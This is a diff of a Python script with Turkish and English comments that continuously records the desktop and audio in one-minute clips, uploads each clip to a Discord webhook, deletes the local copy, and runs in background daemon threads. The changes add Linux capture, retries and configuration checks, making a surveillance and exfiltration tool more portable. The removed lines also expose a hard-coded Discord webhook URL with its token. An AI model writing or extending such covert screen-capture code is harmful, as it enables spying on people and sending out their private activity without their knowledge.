@@ -6,13 +6,23 @@ import subprocess
 import glob
 import logging
 from pathlib import Path
+import json
+import platform
 
 # Configuration
 script_dir = Path(__file__).resolve().parent
-ffmpeg_path = Path('C:\\ffmpeg\\bin\\ffmpeg.exe')
-webhook_url = 'https://discord.com/api/webhooks/1246738691519676478/k2sl3zBuq3nQHcbHTg7oZTNW-YZFSSzguShau1-zi3w_tYnIgIO5er4fyUfjZO1Sm5i7'
+ffmpeg_path = Path('C:\\ffmpeg\\bin\\ffmpeg.exe') if platform.system() == 'Windows' else Path('/usr/bin/ffmpeg')
+webhook_url = os.getenv('DISCORD_WEBHOOK_URL')  # Webhook URL'sini ortam değişkeninden al
 clear_interval = 3600  # Clear old files every hour
 video_duration = 60  # Duration of each screen recording
+max_file_age = 86400  # Maximum file age in seconds (e.g., 1 day)
+
+# Validate configurations
+if not ffmpeg_path.exists():
+    raise FileNotFoundError(f"FFmpeg bulunamadı: {ffmpeg_path}. Lütfen FFmpeg'in doğru yolda olduğundan emin olun.")
+
+if not webhook_url:
+    raise ValueError("Discord webhook URL'si ayarlanmadı. Lütfen 'DISCORD_WEBHOOK_URL' ortam değişkenini ayarlayın.")
 
 # Set up logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -26,85 +36,99 @@ def get_screen_resolution():
 
 def clear_old_files():
     while True:
+        logger.info("Eski dosyaları temizlemeye başlandı.")
+        current_time = time.time()
         for file in glob.glob(str(script_dir / '*.mp4')) + glob.glob(str(script_dir / '*.txt')):
             try:
-                os.remove(file)
-                logger.info(f"Deleted old file: {file}")
+                file_age = current_time - os.path.getmtime(file)
+                if file_age > max_file_age:
+                    os.remove(file)
+                    logger.info(f"Silinen eski dosya: {file}")
             except Exception as e:
-                logger.error(f"Failed to delete {file}: {e}")
+                logger.error(f"{file} dosyası silinirken hata oluştu: {e}")
         time.sleep(clear_interval)
 
 def record_screen(duration, output_file):
     resolution = get_screen_resolution()
-    audio_device = "Line 1 (Virtual Audio Cable)"  # Change this to your actual audio device name
+    audio_device = "Line 1 (Virtual Audio Cable)"  # Kullanıcıya uygun ses cihazını ayarlayın veya ortam değişkeni kullanın
+
     command = [
-        str(ffmpeg_path), '-y', '-f', 'gdigrab', '-framerate', '15', '-i', 'desktop',
-        '-f', 'dshow', '-i', f'audio={audio_device}',  # Using the detected audio device
-        '-s', resolution, '-t', str(duration), 
-        '-c:v', 'libx264', '-preset', 'fast', '-b:v', '2000k',  # Lower bitrate for smaller file size
-        '-c:a', 'aac', '-b:a', '128k',  # Lower audio bitrate
-        '-pix_fmt', 'yuv420p',  # Ensure compatibility
+        str(ffmpeg_path), '-y', '-f', 'gdigrab' if platform.system() == 'Windows' else 'x11grab',
+        '-framerate', '15', '-i', 'desktop',
+        '-f', 'dshow' if platform.system() == 'Windows' else 'pulse', '-i', f'audio={audio_device}',
+        '-s', resolution, '-t', str(duration),
+        '-c:v', 'libx264', '-preset', 'fast', '-b:v', '2000k',
+        '-c:a', 'aac', '-b:a', '128k',
+        '-pix_fmt', 'yuv420p',
         output_file
     ]
+
     try:
+        logger.info(f"Kaydediliyor: {output_file}")
         subprocess.run(command, capture_output=True, text=True, check=True)
+        logger.info(f"Kaydedildi: {output_file}")
     except FileNotFoundError:
-        logger.error("ffmpeg not found. Please ensure ffmpeg is installed and available in your PATH.")
+        logger.error("FFmpeg bulunamadı. Lütfen FFmpeg'in kurulu ve PATH'de olduğundan emin olun.")
     except subprocess.CalledProcessError as e:
-        logger.error(f"ffmpeg command failed: {e}")
+        logger.error(f"FFmpeg komutu başarısız oldu: {e.stderr}")
 
 def send_to_discord(file_path, webhook_url, retries=3, backoff_factor=2):
     attempt = 0
     while attempt < retries:
         try:
             with open(file_path, 'rb') as file:
-                files = {'file': (os.path.basename(file_path), file.read(), 'video/mp4')}
+                files = {'file': (os.path.basename(file_path), file, 'video/mp4')}
                 response = requests.post(webhook_url, files=files)
                 response.raise_for_status()
-            logger.info("Upload successful.")
+            logger.info("Yükleme başarılı.")
             delete_file(file_path)
             return True
         except requests.RequestException as e:
             attempt += 1
-            logger.error(f"Failed to send file to Discord (attempt {attempt}/{retries}): {e}")
-            time.sleep(backoff_factor ** attempt)  # Exponential backoff
+            logger.error(f"Discord'a dosya gönderme başarısız (deneme {attempt}/{retries}): {e}")
+            time.sleep(backoff_factor ** attempt)  # Üssel geri çekilme
+    logger.error(f"Dosya Discord'a gönderilemedi: {file_path}")
     return False
 
 def delete_file(file_path):
     try:
         if os.path.exists(file_path):
             os.remove(file_path)
-            logger.info(f"File {file_path} deleted successfully.")
+            logger.info(f"Dosya silindi: {file_path}")
     except Exception as e:
-        logger.error(f"Failed to delete file {file_path}: {e}")
+        logger.error(f"Dosya silinirken hata oluştu {file_path}: {e}")
 
 def capture_and_send_videos():
     global previous_video_filename
     while True:
         video_filename = script_dir / f"screenrecord-{int(time.time())}.mp4"
         
-        # Start recording the next video
+        # Kaydı başlat
         record_thread = threading.Thread(target=record_screen, args=(video_duration, str(video_filename)))
         record_thread.start()
         
-        # Start uploading the previous video if it exists
+        # Önceki videoyu yükle
         if previous_video_filename:
             upload_thread = threading.Thread(target=send_to_discord, args=(str(previous_video_filename), webhook_url))
             upload_thread.start()
         
-        # Wait for the current recording to finish
+        # Kaydın bitmesini bekle
         record_thread.join()
         
-        # Set the current video as the previous video for the next loop
+        # Bir sonraki döngü için önceki videoyu ayarla
         previous_video_filename = video_filename
 
-# Start background threads
-threading.Thread(target=clear_old_files, daemon=True).start()
-threading.Thread(target=capture_and_send_videos, daemon=True).start()
+def main():
+    # Arka plan iş parçacıklarını başlat
+    threading.Thread(target=clear_old_files, daemon=True).start()
+    threading.Thread(target=capture_and_send_videos, daemon=True).start()
+    
+    # Ana iş parçacığını canlı tut
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        logger.info("Kullanıcı tarafından sonlandırıldı.")
 
-# Keep the main thread alive
-try:
-    while True:
-        time.sleep(1)
-except KeyboardInterrupt:
-    logger.info("Script terminated by user.")
+if __name__ == "__main__":
+    main()
